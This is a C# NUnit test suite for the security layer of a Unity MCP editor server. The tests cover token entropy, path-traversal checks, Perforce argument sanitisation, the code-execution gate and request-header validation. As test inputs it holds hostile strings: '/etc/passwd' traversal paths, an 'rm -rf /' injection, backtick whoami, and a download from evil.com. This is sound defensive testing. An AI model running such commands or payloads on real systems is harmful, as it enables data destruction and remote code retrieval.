using System;
using System.Collections.Generic;
using System.Reflection;
using I1rr.UnityMcp.Shared;
using Newtonsoft.Json.Linq;
using NUnit.Framework;

namespace I1rr.UnityMcp.Editor.Tests
{
    /// <summary>
    /// Security-focused tests: token entropy, constant-time comparison, path traversal prevention,
    /// P4 argument sanitization, execute_code gate, Host validation, and origin validation.
    /// Extends existing McpAuthTests and P4ArgumentTests with additional attack patterns.
    /// </summary>
    public class SecurityTests
    {
        private string _originalProjectRoot;

        [SetUp]
        public void SetUp()
        {
            _originalProjectRoot = McpPathValidator.ProjectRoot;
        }

        [TearDown]
        public void TearDown()
        {
            if (_originalProjectRoot != null)
                McpPathValidator.ProjectRoot = _originalProjectRoot;
            else
            {
                var field = typeof(McpPathValidator).GetField("_projectRoot",
                    BindingFlags.Static | BindingFlags.NonPublic);
                field?.SetValue(null, null);
            }
        }

        #region Token Entropy and Randomness

        [Test]
        public void TokenEntropy_ByteDistribution_NotTrivial()
        {
            // Generate multiple tokens and verify byte distribution is not degenerate
            var byteHistogram = new int[256];
            for (int i = 0; i < 100; i++)
            {
                var token = McpAuth.GenerateToken();
                var base64 = token.Replace('-', '+').Replace('_', '/');
                switch (base64.Length % 4)
                {
                    case 2: base64 += "=="; break;
                    case 3: base64 += "="; break;
                }
                var bytes = Convert.FromBase64String(base64);
                foreach (var b in bytes)
                    byteHistogram[b]++;
            }

            // With 3200 random bytes (100 tokens × 32 bytes), expect reasonable spread
            int usedBuckets = 0;
            for (int i = 0; i < 256; i++)
            {
                if (byteHistogram[i] > 0)
                    usedBuckets++;
            }

            // With truly random data, we expect most of the 256 buckets to be hit
            Assert.That(usedBuckets, Is.GreaterThan(200),
                $"Expected >200 distinct byte values in 3200 random bytes, got {usedBuckets}. " +
                "Token generation may not be using a proper CSPRNG.");
        }

        [Test]
        public void TokenEntropy_NoConsecutiveDuplicates()
        {
            string prev = null;
            for (int i = 0; i < 50; i++)
            {
                var token = McpAuth.GenerateToken();
                Assert.That(token, Is.Not.EqualTo(prev),
                    "Consecutive tokens must never be equal.");
                prev = token;
            }
        }

        [Test]
        public void TokenEntropy_NotAllSameCharacter()
        {
            for (int i = 0; i < 20; i++)
            {
                var token = McpAuth.GenerateToken();
                var allSame = true;
                for (int j = 1; j < token.Length; j++)
                {
                    if (token[j] != token[0])
                    {
                        allSame = false;
                        break;
                    }
                }
                Assert.That(allSame, Is.False,
                    $"Token '{token}' has all identical characters — indicates broken RNG.");
            }
        }

        #endregion

        #region Constant-Time Comparison Verification

        [Test]
        public void ConstantTimeCompare_EarlyDifference_StillComparesFull()
        {
            // Verify that tokens differing only in the first character still get
            // the correct False result (not short-circuited to True)
            var token = McpAuth.GenerateToken();
            var modified = (token[0] == 'A' ? 'B' : 'A') + token.Substring(1);
            Assert.That(McpAuth.ConstantTimeTokenEquals(modified, token), Is.False);
        }

        [Test]
        public void ConstantTimeCompare_LateDifference_StillReturnsFalse()
        {
            var token = McpAuth.GenerateToken();
            var modified = token.Substring(0, token.Length - 1) +
                           (token[token.Length - 1] == 'A' ? 'B' : 'A');
            Assert.That(McpAuth.ConstantTimeTokenEquals(modified, token), Is.False);
        }

        [Test]
        public void ConstantTimeCompare_BothNull_ReturnsFalse()
        {
            Assert.That(McpAuth.ConstantTimeTokenEquals(null, null), Is.False);
        }

        [Test]
        public void ConstantTimeCompare_BothEmpty_ReturnsFalse()
        {
            Assert.That(McpAuth.ConstantTimeTokenEquals("", ""), Is.False);
        }

        [Test]
        public void ConstantTimeCompare_DifferentLengths_ReturnsFalse()
        {
            Assert.That(McpAuth.ConstantTimeTokenEquals("short", "a-much-longer-string-value"), Is.False);
        }

        #endregion

        #region Path Traversal Prevention — Extensive Attack Patterns

        [Test]
        public void PathTraversal_DotDotSlash_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("../secret.txt").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_DeepTraversal_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("Assets/../../../../../../etc/passwd").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_BackslashDotDot_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("Assets\\..\\..\\secret.txt").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_MixedSeparators_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("Assets/sub\\..\\..\\..\\secret").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_UncPath_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("\\\\attacker\\share\\malware.exe").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_UncPathForwardSlash_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("//attacker/share/malware.exe").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_AbsoluteWindowsPath_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("C:\\Windows\\System32\\cmd.exe").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_AbsoluteUnixPath_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("/etc/passwd").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_NullByte_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            var result = McpPathValidator.ValidatePath("Assets/file\0.cs");
            Assert.That(result.IsValid, Is.False);
            Assert.That(result.Error, Is.EqualTo("null_byte"));
        }

        [Test]
        public void PathTraversal_DoubleQuote_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            var result = McpPathValidator.ValidatePath("Assets/file\".cs");
            Assert.That(result.IsValid, Is.False);
            Assert.That(result.Error, Is.EqualTo("invalid_char_quote"));
        }

        [Test]
        public void PathTraversal_InternalParentSegmentResolvesWithinRoot()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            var result = McpPathValidator.ValidatePath("Assets/sub/..");
            Assert.That(result.IsValid, Is.True);
            Assert.That(result.ResolvedPath.TrimEnd(System.IO.Path.DirectorySeparatorChar),
                Is.EqualTo(System.IO.Path.Combine(System.IO.Path.GetTempPath(), "Assets")));
        }

        [Test]
        public void PathTraversal_EmptyPath_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_WhitespaceOnlyPath_Rejected()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            Assert.That(McpPathValidator.ValidatePath("   ").IsValid, Is.False);
        }

        [Test]
        public void PathTraversal_ValidRelativePath_Accepted()
        {
            McpPathValidator.ProjectRoot = System.IO.Path.GetTempPath();
            var result = McpPathValidator.ValidatePath("subdir/file.txt");
            // May or may not succeed depending on symlink checks, but should NOT fail with traversal error
            if (!result.IsValid)
                Assert.That(result.Error, Is.Not.EqualTo("outside_project_root").And.Not.EqualTo("path_traversal"));
        }

        #endregion

        #region P4 Argument Sanitization — Shell Metacharacters

        [Test]
        public void P4Args_SemicolonInjection_EscapedOrRejected()
        {
            var method = typeof(P4EditTools).Assembly.GetType("I1rr.UnityMcp.Editor.P4CommandRunner", true).GetMethod("BuildP4Arguments",
                BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (method == null)
            {
                Assert.Ignore("BuildP4Arguments not accessible.");
                return;
            }

            var result = (string)method.Invoke(null, new object[] { "edit", new[] { "Assets/file;rm -rf /" } });
            // The semicolon should be inside quotes or escaped, not a bare shell separator
            Assert.That(result, Does.Not.Contain("; rm"));
        }

        [Test]
        public void P4Args_PipeInjection_Escaped()
        {
            var method = typeof(P4EditTools).Assembly.GetType("I1rr.UnityMcp.Editor.P4CommandRunner", true).GetMethod("BuildP4Arguments",
                BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (method == null)
            {
                Assert.Ignore("BuildP4Arguments not accessible.");
                return;
            }

            var result = (string)method.Invoke(null, new object[] { "edit", new[] { "Assets/file|evil" } });
            // p4 is launched directly with UseShellExecute=false; shell punctuation stays literal.
            Assert.That(result, Does.EndWith("edit Assets/file|evil"));
        }

        [Test]
        public void P4Args_BacktickInjection_Escaped()
        {
            var method = typeof(P4EditTools).Assembly.GetType("I1rr.UnityMcp.Editor.P4CommandRunner", true).GetMethod("BuildP4Arguments",
                BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (method == null)
            {
                Assert.Ignore("BuildP4Arguments not accessible.");
                return;
            }

            var result = (string)method.Invoke(null, new object[] { "edit", new[] { "Assets/`whoami`" } });
            Assert.That(result, Does.EndWith("edit Assets/`whoami`"));
        }

        [Test]
        public void P4Args_DollarSignInjection_Escaped()
        {
            var method = typeof(P4EditTools).Assembly.GetType("I1rr.UnityMcp.Editor.P4CommandRunner", true).GetMethod("BuildP4Arguments",
                BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (method == null)
            {
                Assert.Ignore("BuildP4Arguments not accessible.");
                return;
            }

            var result = (string)method.Invoke(null, new object[] { "edit", new[] { "Assets/$HOME/secret" } });
            Assert.That(result, Does.EndWith("edit Assets/$HOME/secret"));
        }

        [Test]
        public void P4Args_FlagInjection_ViaLeadingDash_NotPossibleAsFirstArg()
        {
            var method = typeof(P4EditTools).Assembly.GetType("I1rr.UnityMcp.Editor.P4CommandRunner", true).GetMethod("BuildP4Arguments",
                BindingFlags.Static | BindingFlags.Public | BindingFlags.NonPublic);
            if (method == null)
            {
                Assert.Ignore("BuildP4Arguments not accessible.");
                return;
            }

            // A path starting with - could be misinterpreted as a flag
            var result = (string)method.Invoke(null, new object[] { "edit", new[] { "-d all" } });
            // Should be quoted to prevent flag interpretation
            Assert.That(result, Does.Contain("\""));
        }

        #endregion

        #region execute_code Gate

        [Test]
        public void ExecuteCode_DisabledByDefault_CannotRun()
        {
            var wasEnabled = McpPreferencesProvider.EnableCodeExecution;
            try
            {
                McpPreferencesProvider.EnableCodeExecution = false;
                var result = UtilityTools.ExecuteCode(new JObject { ["code"] = "System.Environment.Exit(1)" });
                Assert.That(result["success"]?.Value<bool>(), Is.False);
                Assert.That(result["error"]?.Value<string>(), Does.Contain("disabled"));
            }
            finally
            {
                McpPreferencesProvider.EnableCodeExecution = wasEnabled;
            }
        }

        [Test]
        public void ExecuteCode_GateNotBypassedThroughBatch()
        {
            var wasEnabled = McpPreferencesProvider.EnableCodeExecution;
            try
            {
                McpPreferencesProvider.EnableCodeExecution = false;

                // Invoke exactly as batch_execute does — via McpToolRegistry.Invoke
                var result = McpToolRegistry.Invoke("execute_code",
                    new JObject { ["code"] = "new System.Net.WebClient().DownloadString(\"http://evil.com\")" });

                var json = result.ToString().ToLowerInvariant();
                Assert.That(json, Does.Contain("disabled"),
                    "execute_code gate must be enforced inside the tool method, not at routing layer.");
            }
            finally
            {
                McpPreferencesProvider.EnableCodeExecution = wasEnabled;
            }
        }

        [Test]
        public void ExecuteCode_EmptyCode_ReturnsError()
        {
            var wasEnabled = McpPreferencesProvider.EnableCodeExecution;
            try
            {
                McpPreferencesProvider.EnableCodeExecution = true;
                var result = UtilityTools.ExecuteCode(new JObject { ["code"] = "" });
                Assert.That(result["success"]?.Value<bool>(), Is.False);
            }
            finally
            {
                McpPreferencesProvider.EnableCodeExecution = wasEnabled;
            }
        }

        [Test]
        public void ExecuteCode_NullCode_ReturnsError()
        {
            var wasEnabled = McpPreferencesProvider.EnableCodeExecution;
            try
            {
                McpPreferencesProvider.EnableCodeExecution = true;
                var result = UtilityTools.ExecuteCode(new JObject());
                Assert.That(result["success"]?.Value<bool>(), Is.False);
            }
            finally
            {
                McpPreferencesProvider.EnableCodeExecution = wasEnabled;
            }
        }

        #endregion

        #region Host Validation

        [Test]
        public void ValidateHost_Localhost_Accepted()
        {
            Assert.That(McpAuth.ValidateHost("localhost:8080", 8080), Is.True);
        }

        [Test]
        public void ValidateHost_127001_Accepted()
        {
            Assert.That(McpAuth.ValidateHost("127.0.0.1:8080", 8080), Is.True);
        }

        [Test]
        public void ValidateHost_LanIp_Rejected()
        {
            Assert.That(McpAuth.ValidateHost("192.168.1.100:8080", 8080), Is.False);
        }

        [Test]
        public void ValidateHost_AllInterfaces_Rejected()
        {
            Assert.That(McpAuth.ValidateHost("0.0.0.0:8080", 8080), Is.False);
        }

        [Test]
        public void ValidateHost_WrongPort_Rejected()
        {
            Assert.That(McpAuth.ValidateHost("127.0.0.1:9999", 8080), Is.False);
        }

        [Test]
        public void ValidateHost_Null_Rejected()
        {
            Assert.That(McpAuth.ValidateHost(null, 8080), Is.False);
        }

        [Test]
        public void ValidateHost_Empty_Rejected()
        {
            Assert.That(McpAuth.ValidateHost("", 8080), Is.False);
        }

        [Test]
        public void ValidateHost_WithAdditionalHosts_Accepted()
        {
            var additional = new HashSet<string> { "10.0.0.5:8080" };
            Assert.That(McpAuth.ValidateHost("10.0.0.5:8080", 8080, additional), Is.True);
        }

        [Test]
        public void ValidateHost_IPv6Loopback_Rejected()
        {
            // IPv6 loopback is not in the default allowlist
            Assert.That(McpAuth.ValidateHost("[::1]:8080", 8080), Is.False);
        }

        #endregion

        #region Origin Validation

        [Test]
        public void ValidateOrigin_Null_Accepted()
        {
            Assert.That(McpAuth.ValidateOrigin(null, 8080), Is.True);
        }

        [Test]
        public void ValidateOrigin_NullString_Rejected()
        {
            Assert.That(McpAuth.ValidateOrigin("null", 8080), Is.False);
        }

        [Test]
        public void ValidateOrigin_VscodeWebview_Accepted()
        {
            Assert.That(McpAuth.ValidateOrigin("vscode-webview://abc123", 8080), Is.True);
        }

        [Test]
        public void ValidateOrigin_Localhost_Accepted()
        {
            Assert.That(McpAuth.ValidateOrigin("http://localhost:8080", 8080), Is.True);
        }

        [Test]
        public void ValidateOrigin_127001_Accepted()
        {
            Assert.That(McpAuth.ValidateOrigin("http://127.0.0.1:8080", 8080), Is.True);
        }

        [Test]
        public void ValidateOrigin_ExternalSite_Rejected()
        {
            Assert.That(McpAuth.ValidateOrigin("http://evil.com", 8080), Is.False);
        }

        [Test]
        public void ValidateOrigin_WrongPort_Rejected()
        {
            Assert.That(McpAuth.ValidateOrigin("http://127.0.0.1:9999", 8080), Is.False);
        }

        [Test]
        public void ValidateOrigin_HttpsScheme_Rejected()
        {
            // Only http is expected for localhost MCP server
            Assert.That(McpAuth.ValidateOrigin("https://127.0.0.1:8080", 8080), Is.False);
        }

        #endregion

        #region Content-Type Validation

        [Test]
        public void ValidateContentType_ApplicationJson_Accepted()
        {
            Assert.That(McpAuth.ValidateContentType("application/json"), Is.True);
        }

        [Test]
        public void ValidateContentType_WithCharset_Accepted()
        {
            Assert.That(McpAuth.ValidateContentType("application/json; charset=utf-8"), Is.True);
        }

        [Test]
        public void ValidateContentType_TextPlain_Rejected()
        {
            Assert.That(McpAuth.ValidateContentType("text/plain"), Is.False);
        }

        [Test]
        public void ValidateContentType_Null_Rejected()
        {
            Assert.That(McpAuth.ValidateContentType(null), Is.False);
        }

        [Test]
        public void ValidateContentType_Empty_Rejected()
        {
            Assert.That(McpAuth.ValidateContentType(""), Is.False);
        }

        #endregion

        #region Authorization Header Validation

        [Test]
        public void ValidateAuth_MissingBearer_Rejected()
        {
            var token = McpAuth.GenerateToken();
            Assert.That(McpAuth.ValidateAuthorizationHeader(token, token), Is.False,
                "Raw token without Bearer prefix should be rejected.");
        }

        [Test]
        public void ValidateAuth_BasicScheme_Rejected()
        {
            var token = McpAuth.GenerateToken();
            Assert.That(McpAuth.ValidateAuthorizationHeader($"Basic {token}", token), Is.False);
        }

        [Test]
        public void ValidateAuth_BearerWithExtraSpaces_Rejected()
        {
            var token = McpAuth.GenerateToken();
            Assert.That(McpAuth.ValidateAuthorizationHeader($"Bearer  {token}", token), Is.False,
                "Extra space after Bearer should cause mismatch.");
        }

        [Test]
        public void ValidateAuth_ValidBearer_Accepted()
        {
            var token = McpAuth.GenerateToken();
            Assert.That(McpAuth.ValidateAuthorizationHeader($"Bearer {token}", token), Is.True);
        }

        #endregion
    }
}
